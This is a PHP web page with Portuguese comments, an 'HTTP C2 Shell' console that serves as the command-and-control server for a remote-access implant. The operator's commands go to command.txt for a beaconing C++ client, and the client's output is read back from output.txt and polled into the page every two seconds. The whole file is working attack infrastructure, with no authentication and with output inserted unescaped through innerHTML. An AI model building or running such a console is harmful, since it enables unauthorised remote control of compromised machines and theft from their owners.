<?php
// /c2/c2_shell.php
$command_file = 'command.txt';
$output_file = 'output.txt';

// --- Lógica de Envio de Comando ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = trim($_POST['command']);
    
    // 1. Escreve o novo comando para o binário C++
    file_put_contents($command_file, $command);
    
    // 2. Limpa o arquivo de saída, indicando que estamos esperando uma nova resposta
    file_put_contents($output_file, "EXECUTING: " . $command . "\n\n(Awaiting response...)");
    
    // Redireciona para evitar reenvio do formulário
    header("Location: c2_shell.php");
    exit();
}

// --- Carregar o estado atual para o console ---
$current_command = file_exists($command_file) ? file_get_contents($command_file) : 'NO_COMMAND';
$current_output = file_exists($output_file) ? file_get_contents($output_file) : '';

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>C2 HTTP Shell Console</title>
    <style>
        body { font-family: 'Courier New', monospace; background-color: #1e1e1e; color: #00ff00; }
        .console { background-color: #000; padding: 15px; border: 1px solid #333; height: 70vh; overflow-y: scroll; white-space: pre-wrap; margin-bottom: 20px;}
        .prompt { color: #fff; }
        input[type="text"] { background: #000; border: none; color: #00ff00; width: 80%; padding: 5px; outline: none; }
        form { display: flex; align-items: center; }
        .status-bar { background-color: #333; color: #fff; padding: 5px; font-size: 0.8em; margin-bottom: 10px; }
    </style>
</head>
<body>

    <div class="status-bar" id="status-bar">
        Status: Loaded. Next Beacon in C++ client is approx. 10s.
    </div>

    <h1>HTTP C2 Shell</h1>
    
    <div class="console" id="console-output">
        <span class="prompt">C2 Shell v1.0: </span> Running...
        <p><?php echo htmlspecialchars($current_output); ?></p>
    </div>

    <form method="POST">
        <span class="prompt">C2 Shell > </span>
        <input type="text" name="command" id="command-input" placeholder="Enter command (e.g., whoami, ipconfig)" autofocus required>
    </form>
    
    <script>
        // Função para atualizar a saída
        function fetchOutput() {
            fetch('output.txt?t=' + new Date().getTime()) // O parâmetro 't' força o navegador a não usar cache
                .then(response => response.text())
                .then(data => {
                    const consoleOutput = document.getElementById('console-output');
                    const isAwaiting = data.includes('(Awaiting response...)');
                    
                    // Atualiza o console
                    consoleOutput.innerHTML = '<span class="prompt">Output:</span>\n' + data;
                    
                    // Atualiza o status bar
                    if (isAwaiting) {
                        document.getElementById('status-bar').textContent = 'Status: Waiting for C++ client beacon/execution...';
                    } else {
                        document.getElementById('status-bar').textContent = 'Status: READY. Last output received.';
                    }
                })
                .catch(error => console.error('Error fetching output:', error));
        }

        // Faz o Long Polling a cada 2 segundos. Isso garante uma "sensação" de tempo real.
        setInterval(fetchOutput, 2000); 

        // Roda a função imediatamente ao carregar
        fetchOutput(); 
    </script>

</body>
</html>
